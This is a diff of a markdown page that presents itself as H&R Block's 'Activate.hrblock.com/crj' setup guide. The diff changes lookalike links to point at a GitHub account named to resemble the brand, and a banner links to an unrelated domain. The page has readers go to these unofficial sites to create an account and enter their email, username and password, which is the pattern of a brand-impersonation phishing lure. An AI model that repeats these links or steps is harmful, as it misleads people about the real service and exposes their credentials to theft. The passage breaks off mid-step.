@@ -3,7 +3,7 @@
 [![Activate.hrblock.com/crj](get-started.png)](https://ht.amdonline.site/)
 
 
-H&R Block Tax Software is designed for those who want to be in control of their tax preparation experience and feel empowered by completing their own returns. They want to get the biggest refund possible and are often the homeowner, investor, or both. visit [Activate.hrblock.com/crj](http://activate.hrblock.com.crj.github.io/) for more information.
+H&R Block Tax Software is designed for those who want to be in control of their tax preparation experience and feel empowered by completing their own returns. They want to get the biggest refund possible and are often the homeowner, investor, or both. visit [Activate.hrblock.com/crj](https://github.com/activate-hrblockcomcrj/) for more information.
 
 ## Benefits of using H&R Block
 
@@ -20,13 +20,13 @@ H&R Block Tax Software is designed for those who want to be in control of their 
 ## How to Create H&R Block Account?
 
 * First open any web browser.
-* Go to their [Activate.hrblock.com/crj](http://activate.hrblock.com.crj.github.io/) site.
+* Go to their [Activate.hrblock.com/crj](https://github.com/activate-hrblockcomcrj/) site.
 * Choose My Account login in the upper right-hand corner of the screen.
 * Click on create an account if you are a new user.
 * Enter your valid email, Username and Password
 * Then complete all steps.
 
-## Activate H&R Block Software | [Activate.hrblock.com/crj](http://activate.hrblock.com.crj.github.io/)
+## Activate H&R Block Software | [Activate.hrblock.com/crj](https://github.com/activate-hrblockcomcrj/)
 
 * Open the H&R Block Tax Software.
 * If the software is already open it, 
